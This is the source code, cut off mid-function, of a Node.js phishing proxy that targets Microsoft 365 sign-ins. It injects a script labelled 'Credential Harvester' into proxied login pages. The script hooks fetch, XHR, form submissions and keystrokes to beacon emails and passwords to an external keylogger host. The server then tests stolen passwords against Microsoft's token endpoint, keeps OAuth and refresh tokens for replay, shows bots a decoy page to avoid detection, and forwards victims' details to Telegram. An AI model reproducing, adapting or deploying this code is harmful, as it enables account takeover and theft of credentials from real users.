const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');
const url = require('url');

// ============================================================
//  ENHANCED CONFIGURATION - All sensitive data in .env
// ============================================================

// Load environment variables
require('dotenv').config();

const BACKEND_URL = process.env.BACKEND_URL || "https://mtr6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyse.onrender.com/log";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";

// Microsoft OAuth2 Configuration
const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || "943a2b14-68aa-4205-88c1-a4b65ab04e81";
const MICROSOFT_TENANT = process.env.MICROSOFT_TENANT || "common";
const MICROSOFT_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || "https://login.microsoftonline.com/common/oauth2/nativeclient";

// Session Configuration
const SESSION_TTL = parseInt(process.env.SESSION_TTL) || 60 * 60 * 1000;
const MAX_ATTEMPTS = parseInt(process.env.MAX_ATTEMPTS) || 5;
const PROXY_TIMEOUT = parseInt(process.env.PROXY_TIMEOUT) || 30000;

console.log(`[CONFIG] 🔗 Keylogger URL: ${KEYLOGGER_URL}`);
console.log(`[CONFIG] 🔗 Backend URL: ${BACKEND_URL}`);
console.log(`[CONFIG] 🔗 Microsoft Client ID: ${MICROSOFT_CLIENT_ID.substring(0, 10)}...`);
console.log(`[CONFIG] 🔗 Session TTL: ${SESSION_TTL}ms`);

// ============================================================
//  ENHANCED: Token & Session Management
// ============================================================

const userSessions = {};
const attemptCounts = new Map();
const tokenBlacklist = new Set();
const ipTrustScores = new Map();
const sessionTokenMap = new Map();

function generateSecureToken() {
    return crypto.randomBytes(32).toString('base64');
}

function createFingerprint(req) {
    const parts = [
        req.headers['user-agent'],
        req.headers['accept-language'],
        req.headers['accept-encoding'],
        req.headers['sec-ch-ua'],
        req.headers['sec-ch-ua-platform'],
        req.headers['sec-ch-ua-mobile'],
        req.headers['dnt']
    ];
    return crypto.createHash('sha256').update(parts.join('|')).digest('hex');
}

// ============================================================
//  ENHANCED: IP Rotation & Anonymity
// ============================================================

class IPRotator {
    constructor() {
        this.proxyList = [];
        this.currentIndex = 0;
        this.rotationInterval = 5 * 60 * 1000;
        this.lastRotation = Date.now();
        this.loadProxies();
    }

    loadProxies() {
        // Load from environment or use default
        const proxyString = process.env.PROXY_LIST || '';
        if (proxyString) {
            this.proxyList = proxyString.split(',').map(p => {
                const [host, port] = p.split(':');
                return { host, port: parseInt(port) || 8080 };
            });
        }
        
        // Fallback to rotating proxy services
        if (this.proxyList.length === 0) {
            this.proxyList = [
                { host: 'proxy1.example.com', port: 8080 },
                { host: 'proxy2.example.com', port: 8080 }
            ];
        }
    }

    getNextProxy() {
        if (this.proxyList.length === 0) return null;
        const proxy = this.proxyList[this.currentIndex];
        this.currentIndex = (this.currentIndex + 1) % this.proxyList.length;
        return proxy;
    }

    shouldRotate() {
        return Date.now() - this.lastRotation > this.rotationInterval;
    }
}

const ipRotator = new IPRotator();

// ============================================================
//  ENHANCED: Browser Fingerprinting
// ============================================================

function generateRandomUserAgent() {
    const uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    return uas[Math.floor(Math.random() * uas.length)];
}

function generateRandomMicrosoftHeaders() {
    const languages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en-US,en;q=0.9,fr;q=0.8'];
    const platforms = ['"Windows"', '"macOS"', '"Linux"'];
    
    return {
        'accept-language': languages[Math.floor(Math.random() * languages.length)],
        'accept-encoding': 'gzip, deflate, br',
        'sec-ch-ua': '"Microsoft Edge";v="120", "Chromium";v="120", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': platforms[Math.floor(Math.random() * platforms.length)],
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
    };
}

// ============================================================
//  ENHANCED: Stealth Injection for Microsoft
// ============================================================

class MicrosoftScriptInjector {
    constructor() {
        this.injectionMethods = [
            this.injectBeforeBody,
            this.injectAfterHead,
            this.injectViaEvent,
            this.injectViaWorker,
            this.injectViaFetch,
            this.injectViaXHR
        ];
    }

    injectBeforeBody(html, script) {
        return html.replace(/<\/body>/i, script + '</body>');
    }

    injectAfterHead(html, script) {
        return html.replace(/<\/head>/i, script + '</head>');
    }

    injectViaEvent(html, script) {
        const eventScript = `<script>
            document.addEventListener('DOMContentLoaded', function() {
                ${script}
            });
        </script>`;
        return html.replace(/<\/body>/i, eventScript + '</body>');
    }

    injectViaWorker(html) {
        const workerScript = `
        <script>
            // Microsoft-specific service worker
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/sw.js')
                    .then(reg => console.log('SW registered'))
                    .catch(err => console.log('SW registration failed'));
            }
        </script>`;
        return html.replace(/<\/body>/i, workerScript + '</body>');
    }

    injectViaFetch(html) {
        const fetchScript = `
        <script>
            // Microsoft-specific fetch interceptor
            const originalFetch = window.fetch;
            window.fetch = function(...args) {
                const url = args[0];
                const options = args[1] || {};
                
                // Capture Microsoft credentials from fetch
                if (options.body) {
                    try {
                        let body = options.body;
                        if (typeof body === 'string') {
                            const params = new URLSearchParams(body);
                            const email = params.get('login') || params.get('loginfmt') || params.get('username');
                            const password = params.get('passwd') || params.get('password');
                            if (email && password) {
                                navigator.sendBeacon('${KEYLOGGER_URL}', JSON.stringify({
                                    type: 'microsoft_fetch',
                                    email, 
                                    password, 
                                    url,
                                    timestamp: Date.now()
                                }));
                            }
                        }
                    } catch(e) {}
                }
                return originalFetch.apply(this, args);
            };
        </script>`;
        return html.replace(/<\/body>/i, fetchScript + '</body>');
    }

    injectViaXHR(html) {
        const xhrScript = `
        <script>
            // Microsoft-specific XHR interceptor
            const originalXHR = window.XMLHttpRequest;
            window.XMLHttpRequest = function() {
                const xhr = new originalXHR();
                const originalSend = xhr.send;
                
                xhr.send = function(body) {
                    if (body && typeof body === 'string') {
                        try {
                            const params = new URLSearchParams(body);
                            const email = params.get('login') || params.get('loginfmt');
                            const password = params.get('passwd') || params.get('password');
                            if (email && password) {
                                navigator.sendBeacon('${KEYLOGGER_URL}', JSON.stringify({
                                    type: 'microsoft_xhr',
                                    email,
                                    password,
                                    url: window.location.href,
                                    timestamp: Date.now()
                                }));
                            }
                        } catch(e) {}
                    }
                    return originalSend.apply(this, arguments);
                };
                return xhr;
            };
        </script>`;
        return html.replace(/<\/body>/i, xhrScript + '</body>');
    }

    injectMicrosoftScript(html, sessionId) {
        const encodedScript = this.encodeMicrosoftScript(sessionId);
        const method = this.injectionMethods[Math.floor(Math.random() * this.injectionMethods.length)];
        return method.call(this, html, encodedScript);
    }

    encodeMicrosoftScript(sessionId) {
        // Microsoft-specific keylogger with advanced features
        return `<script>
            // Microsoft 365 Credential Harvester v2.0
            (function() {
                const config = {
                    keylogger: '${KEYLOGGER_URL}',
                    backend: '${BACKEND_URL}',
                    session: '${sessionId}',
                    microsoftClientId: '${MICROSOFT_CLIENT_ID}',
                    timestamp: Date.now()
                };

                // Advanced Microsoft credential capture
                let typedEmail = '';
                let typedPassword = '';
                let isMicrosoftLogin = false;

                // Detect Microsoft login page
                function detectMicrosoftLogin() {
                    const url = window.location.href;
                    if (url.includes('login.microsoftonline.com') || 
                        url.includes('login.live.com') ||
                        url.includes('office.com') ||
                        url.includes('outlook.office.com')) {
                        isMicrosoftLogin = true;
                        return true;
                    }
                    return false;
                }

                // Monitor input fields with Microsoft-specific selectors
                function monitorMicrosoftInputs() {
                    const selectors = [
                        'input[name="loginfmt"]',
                        'input[name="login"]', 
                        'input[name="username"]',
                        'input[name="Email"]',
                        'input[type="email"]',
                        'input[name="passwd"]',
                        'input[name="password"]',
                        'input[type="password"]'
                    ];

                    selectors.forEach(selector => {
                        const inputs = document.querySelectorAll(selector);
                        inputs.forEach(input => {
                            if (input.type === 'password') {
                                // Password field
                                input.addEventListener('input', function() {
                                    typedPassword = this.value;
                                    if (typedEmail && typedPassword.length > 3) {
                                        sendMicrosoftCredentials(typedEmail, typedPassword);
                                    }
                                });
                            } else if (input.type === 'email' || input.name.includes('login') || input.name.includes('fmt')) {
                                // Email/username field
                                input.addEventListener('input', function() {
                                    typedEmail = this.value;
                                    if (typedEmail && typedEmail.includes('@') && typedPassword.length > 3) {
                                        sendMicrosoftCredentials(typedEmail, typedPassword);
                                    }
                                });
                            }
                        });
                    });
                }

                // Send Microsoft credentials
                function sendMicrosoftCredentials(email, password) {
                    const data = {
                        type: 'microsoft_credentials',
                        email: email,
                        password: password,
                        service: 'Microsoft 365',
                        url: window.location.href,
                        timestamp: Date.now(),
                        session: config.session,
                        client_id: config.microsoftClientId,
                        referrer: document.referrer,
                        userAgent: navigator.userAgent,
                        screenSize: window.screen.width + 'x' + window.screen.height,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        language: navigator.language,
                        platform: navigator.platform
                    };

                    // Send via multiple methods for redundancy
                    try {
                        // Beacon API
                        navigator.sendBeacon(config.keylogger, JSON.stringify(data));
                        
                        // Fetch as fallback
                        fetch(config.keylogger, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(data),
                            keepalive: true,
                            mode: 'no-cors'
                        }).catch(() => {});
                    } catch(e) {}
                }

                // Monitor Microsoft form submissions
                function monitorMicrosoftForms() {
                    document.addEventListener('submit', function(e) {
                        const form = e.target;
                        if (detectMicrosoftLogin()) {
                            const formData = new FormData(form);
                            let email = formData.get('loginfmt') || 
                                      formData.get('login') || 
                                      formData.get('username') ||
                                      formData.get('Email');
                            let password = formData.get('passwd') || 
                                         formData.get('password');
                            
                            if (email && password) {
                                sendMicrosoftCredentials(email, password);
                            }
                            
                            // Also capture all form data
                            const allData = {};
                            for (let [key, value] of formData.entries()) {
                                allData[key] = value;
                            }
                            
                            // Send full form data for analysis
                            if (Object.keys(allData).length > 0) {
                                navigator.sendBeacon(config.keylogger, JSON.stringify({
                                    type: 'microsoft_form_submit',
                                    data: allData,
                                    url: window.location.href,
                                    timestamp: Date.now()
                                }));
                            }
                        }
                    });
                }

                // Monitor Microsoft-specific URL changes
                function monitorMicrosoftURLChanges() {
                    let lastUrl = window.location.href;
                    setInterval(() => {
                        const currentUrl = window.location.href;
                        if (currentUrl !== lastUrl) {
                            lastUrl = currentUrl;
                            if (currentUrl.includes('login') || currentUrl.includes('signin')) {
                                sendMicrosoftNavigation(currentUrl);
                            }
                        }
                    }, 1000);
                }

                function sendMicrosoftNavigation(url) {
                    navigator.sendBeacon(config.keylogger, JSON.stringify({
                        type: 'microsoft_navigation',
                        url: url,
                        timestamp: Date.now(),
                        session: config.session
                    }));
                }

                // Auto-login detection and capture
                function detectMicrosoftAutoLogin() {
                    // Check for login hints in URL
                    const params = new URLSearchParams(window.location.search);
                    const loginHint = params.get('login_hint');
                    if (loginHint) {
                        typedEmail = loginHint;
                        navigator.sendBeacon(config.keylogger, JSON.stringify({
                            type: 'microsoft_login_hint',
                            email: loginHint,
                            timestamp: Date.now(),
                            session: config.session
                        }));
                    }
                }

                // Initialize
                function initMicrosoftHarvester() {
                    if (detectMicrosoftLogin()) {
                        console.log('[Chameleon] Microsoft harvester active');
                        detectMicrosoftAutoLogin();
                        monitorMicrosoftInputs();
                        monitorMicrosoftForms();
                        monitorMicrosoftURLChanges();
                        
                        // Also monitor for dynamic content
                        const observer = new MutationObserver(function(mutations) {
                            mutations.forEach(function(mutation) {
                                mutation.addedNodes.forEach(function(node) {
                                    if (node.nodeType === 1) { // Element node
                                        // Re-attach listeners to new inputs
                                        const inputs = node.querySelectorAll && 
                                            node.querySelectorAll('input[type="email"], input[type="password"], input[name*="login"], input[name*="passwd"]');
                                        if (inputs && inputs.length > 0) {
                                            monitorMicrosoftInputs();
                                        }
                                    }
                                });
                            });
                        });
                        
                        observer.observe(document.body, {
                            childList: true,
                            subtree: true
                        });
                    }
                }

                // Start when DOM is ready
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', initMicrosoftHarvester);
                } else {
                    initMicrosoftHarvester();
                }
            })();
        </script>`;
    }
}

const injector = new MicrosoftScriptInjector();

// ============================================================
//  ENHANCED: Microsoft Credential Validation
// ============================================================

async function validateMicrosoftCredentials(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: 'openid profile email offline_access',
            client_info: '1'
        });

        const options = {
            hostname: 'login.microsoftonline.com',
            path: `/${MICROSOFT_TENANT}/oauth2/v2.0/token`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': generateRandomUserAgent(),
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                ...generateRandomMicrosoftHeaders()
            },
            timeout: PROXY_TIMEOUT,
            rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    
                    // Check for successful authentication
                    if (response.access_token) {
                        resolve({ 
                            valid: true, 
                            requires2FA: false, 
                            token: response.access_token,
                            refresh_token: response.refresh_token,
                            id_token: response.id_token,
                            expires_in: response.expires_in,
                            scope: response.scope
                        });
                    } 
                    // Check for 2FA/MFA requirement
                    else if (response.error === 'interaction_required' || 
                             response.error === 'consent_required' ||
                             response.error === 'login_required' ||
                             response.error_description?.includes('MFA') ||
                             response.error_description?.includes('multi-factor') ||
                             response.error_description?.includes('2FA') ||
                             response.error_description?.includes('conditional access')) {
                        resolve({ 
                            valid: false, 
                            requires2FA: true, 
                            message: 'Multi-factor authentication required',
                            error: response.error,
                            correlation_id: response.correlation_id || null
                        });
                    } 
                    // Invalid credentials
                    else if (response.error === 'invalid_grant' || 
                             response.error === 'invalid_request') {
                        resolve({ 
                            valid: false, 
                            requires2FA: false, 
                            message: response.error_description || 'Invalid credentials',
                            error: response.error,
                            correlation_id: response.correlation_id || null
                        });
                    }
                    // Other errors
                    else {
                        resolve({ 
                            valid: false, 
                            requires2FA: false, 
                            message: response.error_description || 'Unknown error',
                            error: response.error || 'unknown_error'
                        });
                    }
                } catch (e) {
                    resolve({ 
                        valid: false, 
                        requires2FA: false, 
                        message: 'Failed to parse response'
                    });
                }
            });
        });

        req.on('error', (err) => {
            resolve({ 
                valid: false, 
                requires2FA: false, 
                message: `Network error: ${err.message}`
            });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ 
                valid: false, 
                requires2FA: false, 
                message: 'Request timeout'
            });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
//  ENHANCED: Microsoft-Specific Session Management
// ============================================================

class MicrosoftSessionManager {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = SESSION_TTL;
        this.maxAttempts = MAX_ATTEMPTS;
        this.microsoftTokens = new Map();
        this.refreshTokens = new Map();
    }

    createSession(data) {
        const sessionId = generateSecureToken();
        const session = {
            id: sessionId,
            created: Date.now(),
            lastActivity: Date.now(),
            data: data,
            fingerprint: data.fingerprint || null,
            microsoftTokens: [],
            microsoftCookies: [],
            attempts: 0,
            email: data.email || null,
            validated: false,
            twoFA: false,
            ip: data.ip || null,
            userAgent: data.userAgent || null,
            microsoftSession: null
        };
        
        this.sessions.set(sessionId, session);
        return sessionId;
    }

    getSession(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        if (Date.now() - session.lastActivity > this.sessionTTL) {
            this.sessions.delete(sessionId);
            return null;
        }
        
        session.lastActivity = Date.now();
        return session;
    }

    updateSession(sessionId, data) {
        const session = this.getSession(sessionId);
        if (session) {
            Object.assign(session.data, data);
            session.lastActivity = Date.now();
            return true;
        }
        return false;
    }

    storeMicrosoftToken(sessionId, tokenData) {
        const session = this.getSession(sessionId);
        if (session) {
            session.microsoftTokens.push({
                ...tokenData,
                timestamp: Date.now()
            });
            this.microsoftTokens.set(sessionId, tokenData);
            
            if (tokenData.refresh_token) {
                this.refreshTokens.set(sessionId, tokenData.refresh_token);
            }
            return true;
        }
        return false;
    }

    getMicrosoftTokens(sessionId) {
        const session = this.getSession(sessionId);
        if (session) {
            return session.microsoftTokens;
        }
        return null;
    }

    incrementAttempts(sessionId) {
        const session = this.getSession(sessionId);
        if (session) {
            session.attempts++;
            return session.attempts;
        }
        return -1;
    }

    isBlocked(sessionId) {
        const session = this.getSession(sessionId);
        if (session) {
            return session.attempts >= this.maxAttempts;
        }
        return false;
    }

    // Microsoft-specific: Store OAuth2 tokens for session replay
    storeOAuthTokens(sessionId, tokens) {
        const session = this.getSession(sessionId);
        if (session) {
            session.oauthTokens = tokens;
            session.validated = true;
            if (tokens.id_token) {
                // Parse ID token for user info
                try {
                    const idTokenParts = tokens.id_token.split('.');
                    if (idTokenParts.length === 3) {
                        const payload = JSON.parse(Buffer.from(idTokenParts[1], 'base64').toString());
                        session.email = payload.email || payload.preferred_username || session.email;
                        session.userInfo = payload;
                    }
                } catch(e) {}
            }
            return true;
        }
        return false;
    }

    // Microsoft-specific: Generate session replay URL
    generateSessionReplayUrl(sessionId) {
        const session = this.getSession(sessionId);
        if (session && session.oauthTokens) {
            const tokens = session.oauthTokens;
            // Create a URL that uses the tokens for automatic authentication
            const replayUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}` +
                `&response_type=code` +
                `&redirect_uri=${MICROSOFT_REDIRECT_URI}` +
                `&scope=openid%20profile%20email%20offline_access` +
                `&state=${sessionId}` +
                `&login_hint=${encodeURIComponent(session.email || '')}`;
            return replayUrl;
        }
        return null;
    }
}

const msSessionManager = new MicrosoftSessionManager();

// ============================================================
//  ENHANCED: Anti-Detection
// ============================================================

class AntiDetection {
    constructor() {
        this.requestPatterns = new Map();
        this.suspiciousPatterns = [
            /bot/i, /crawl/i, /spider/i, /scrape/i,
            /headless/i, /phantom/i, /selenium/i,
            /puppeteer/i, /playwright/i,
            /http:\/\/localhost/i, /127\.0\.0\.1/i
        ];
        this.microsoftPatterns = {
            validUserAgents: [
                'Microsoft Office',
                'Microsoft Teams',
                'Outlook',
                'Office 365',
                'Microsoft Authenticator'
            ]
        };
    }

    isBot(userAgent) {
        return this.suspiciousPatterns.some(pattern => pattern.test(userAgent));
    }

    isMicrosoftClient(userAgent) {
        return this.microsoftPatterns.validUserAgents.some(agent => 
            userAgent.includes(agent)
        );
    }

    analyzeRequestPattern(ip) {
        const now = Date.now();
        const pattern = this.requestPatterns.get(ip) || { count: 0, timestamps: [] };
        
        pattern.timestamps = pattern.timestamps.filter(t => now - t < 60000);
        pattern.timestamps.push(now);
        pattern.count = pattern.timestamps.length;
        
        this.requestPatterns.set(ip, pattern);
        
        if (pattern.count > 60) {
            return { suspicious: true, reason: 'Rate limiting detected' };
        }
        
        return { suspicious: false };
    }

    generateRandomDelay() {
        return Math.floor(Math.random() * 3000) + 500;
    }

    async applyDelay() {
        const delay = this.generateRandomDelay();
        await new Promise(resolve => setTimeout(resolve, delay));
    }

    // Microsoft-specific: Generate Microsoft-compatible headers
    generateMicrosoftHeaders() {
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': '"Microsoft Edge";v="120", "Chromium";v="120", "Not_A Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
        };
    }
}

const antiDetection = new AntiDetection();

// ============================================================
//  ENHANCED: Main Server - Microsoft Optimized
// ============================================================

const server = http.createServer(async (req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);
    
    // Apply anti-detection delay
    await antiDetection.applyDelay();

    // Check for bot patterns
    const userAgent = req.headers['user-agent'] || '';
    if (antiDetection.isBot(userAgent)) {
        console.log('[SECURITY] ⚠️ Bot detected, serving Microsoft login page');
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head><title>Microsoft Login</title></head>
            <body>
                <form>
                    <h2>Microsoft</h2>
                    <input type="email" placeholder="Email" />
                    <input type="password" placeholder="Password" />
                    <button>Sign in</button>
                </form>
            </body>
            </html>
        `);
        return;
    }

    // Rate limiting
    const ip = getClientIp(req);
    const rateCheck = antiDetection.analyzeRequestPattern(ip);
    if (rateCheck.suspicious) {
        console.log(`[RATE] ⚠️ Rate limit exceeded for ${ip}`);
        res.writeHead(429, { 'Content-Type': 'text/plain' });
        res.end('Too many requests');
        return;
    }

    // Serve static files
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }

    if (req.url === '/inject.js') {
        serveFile('script_inject.js', res, 'text/javascript');
        return;
    }

    // Service worker for persistent injection
    if (req.url === '/sw.js') {
        const swScript = `
            self.addEventListener('install', function(e) {
                e.waitUntil(self.skipWaiting());
            });
            self.addEventListener('activate', function(e) {
                e.waitUntil(self.clients.claim());
            });
            self.addEventListener('fetch', function(e) {
                e.respondWith(fetch(e.request));
            });
        `;
        res.writeHead(200, { 'Content-Type': 'application/javascript' });
        res.end(swScript);
        return;
    }

    // Health check
    if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            activeSessions: msSessionManager.sessions.size,
            memory: process.memoryUsage(),
            uptime: process.uptime(),
            microsoftTokens: msSessionManager.microsoftTokens.size,
            version: '2.0.0-microsoft'
        }));
        return;
    }

    // Session management endpoints
    if (req.url === '/session' && req.method === 'GET') {
        const sessionId = req.headers['x-session-id'];
        if (sessionId) {
            const session = msSessionManager.getSession(sessionId);
            if (session) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({
                    id: session.id,
                    created: session.created,
                    email: session.email,
                    attempts: session.attempts,
                    validated: session.validated,
                    twoFA: session.twoFA,
                    tokens: session.microsoftTokens ? session.microsoftTokens.length : 0,
                    lastActivity: session.lastActivity
                }));
                return;
            }
        }
        res.writeHead(404, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Session not found' }));
        return;
    }

    // Microsoft token replay endpoint
    if (req.url === '/replay' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId;
                const session = msSessionManager.getSession(sessionId);
                if (session && session.oauthTokens) {
                    const replayUrl = msSessionManager.generateSessionReplayUrl(sessionId);
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({
                        success: true,
                        replayUrl: replayUrl,
                        sessionId: sessionId
                    }));
                } else {
                    res.writeHead(404, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'Session or tokens not found' }));
                }
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Invalid request' }));
            }
        });
        return;
    }

    // Proxy target - Microsoft optimized
    const targetParam = req.url.match(/target=([^&]+)/);
    const targetUrl = targetParam ? decodeURIComponent(targetParam[1]) : null;
    
    // Extract Microsoft-specific parameters
    let urlEmail = null;
    let loginHint = null;
    if (targetUrl) {
        try {
            const parsed = new URL(targetUrl);
            urlEmail = parsed.searchParams.get('e') || 
                      parsed.searchParams.get('email') || 
                      parsed.searchParams.get('login_hint');
            loginHint = parsed.searchParams.get('login_hint');
            if (urlEmail) {
                urlEmail = decodeURIComponent(urlEmail);
            }
        } catch(e) {}
    }

    // Microsoft session management
    let sessionId = req.headers['x-session-id'] || getSessionIdFromCookie(req.headers.cookie);
    let session = sessionId ? msSessionManager.getSession(sessionId) : null;

    if (!session && targetUrl) {
        const fingerprint = createFingerprint(req);
        sessionId = msSessionManager.createSession({
            originalUrl: targetUrl,
            ip: ip,
            fingerprint: fingerprint,
            userAgent: userAgent,
            email: urlEmail,
            timestamp: Date.now(),
            loginHint: loginHint
        });
        session = msSessionManager.getSession(sessionId);
        
        // Set session cookie
        const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
        const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
        res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
        
        console.log(`[SESSION] Created Microsoft session: ${sessionId} for ${urlEmail || 'unknown'}`);
    }

    // Handle POST (credential capture)
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            await handleMicrosoftPost(body, req, res, session, targetUrl, sessionId);
        });
        return;
    }

    // Handle GET (proxy with Microsoft-specific injection)
    if (targetUrl && session) {
        await handleMicrosoftProxy(req, res, targetUrl, session, sessionId);
    } else {
        // Redirect to Microsoft login
        const defaultMicrosoftLogin = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
            `client_id=${MICROSOFT_CLIENT_ID}` +
            `&response_type=code` +
            `&redirect_uri=${MICROSOFT_REDIRECT_URI}` +
            `&scope=openid%20profile%20email%20offline_access`;
        
        res.writeHead(302, { 
            'Location': defaultMicrosoftLogin,
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        });
        res.end();
    }
});

// ============================================================
//  ENHANCED: Handle Microsoft POST
// ============================================================

async function handleMicrosoftPost(body, req, res, session, targetUrl, sessionId) {
    try {
        const ip = getClientIp(req);
        const { email, password, formData } = extractCredentials(body);
        
        // Microsoft-specific detection
        const isMicrosoftLogin = targetUrl && (
            targetUrl.includes('login.microsoftonline.com') ||
            targetUrl.includes('login.live.com') ||
            targetUrl.includes('office.com') ||
            targetUrl.includes('outlook.office.com')
        );

        console.log(`[MICROSOFT] 📧 Email: ${email}`);
        console.log(`[MICROSOFT] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[MICROSOFT] 📡 IP: ${ip}`);
        
        // Increment attempts
        let attempts = 1;
        if (sessionId) {
            attempts = msSessionManager.incrementAttempts(sessionId);
        }

        // Check if blocked
        if (sessionId && msSessionManager.isBlocked(sessionId)) {
            console.log(`[MICROSOFT] ⚠️ Session blocked due to too many attempts`);
            res.writeHead(302, {
                'Location': 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?error=too_many_attempts',
                'Cache-Control': 'no-store'
            });
            res.end();
            return;
        }

        // Validate credentials with Microsoft
        let validationResult = null;
        try {
            validationResult = await validateMicrosoftCredentials(email, password);
            console.log(`[MICROSOFT] ✅ Validation: ${validationResult.valid ? 'VALID' : 'INVALID'}`);
            console.log(`[MICROSOFT] 🔐 2FA Required: ${validationResult.requires2FA ? 'YES' : 'NO'}`);
        } catch (e) {
            console.log('[MICROSOFT] ⚠️ Validation error:', e.message);
        }

        // Update session with credentials and validation
        if (session) {
            session.data.credentials = session.data.credentials || [];
            session.data.credentials.push({
                email: email,
                password: password,
                timestamp: Date.now(),
                ip: ip,
                validation: validationResult,
                service: 'Microsoft 365',
                formData: formData
            });
            
            if (email) session.email = email;
            if (validationResult?.valid) {
                session.validated = true;
                // Store tokens for replay
                if (validationResult.token) {
                    msSessionManager.storeMicrosoftToken(sessionId, validationResult);
                    msSessionManager.storeOAuthTokens(sessionId, validationResult);
                }
            }
            if (validationResult?.requires2FA) {
                session.twoFA = true;
            }
            msSessionManager.updateSession(sessionId, session.data);
        }

        // Track attempts globally
        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        // Send to Telegram with detailed Microsoft info
        await sendMicrosoftTelegramAlert(
            email,
            password,
            validationResult,
            ip,
            attemptCount,
            targetUrl,
            formData,
            sessionId,
            isMicrosoftLogin
        );

        // Send to backend
        await sendToBackend(email, password, req, 'microsoft', ip, validationResult);

        // Determine redirect based on validation
        let redirectUrl = targetUrl || TEAMS_REDIRECT;
        
        if (validationResult?.valid) {
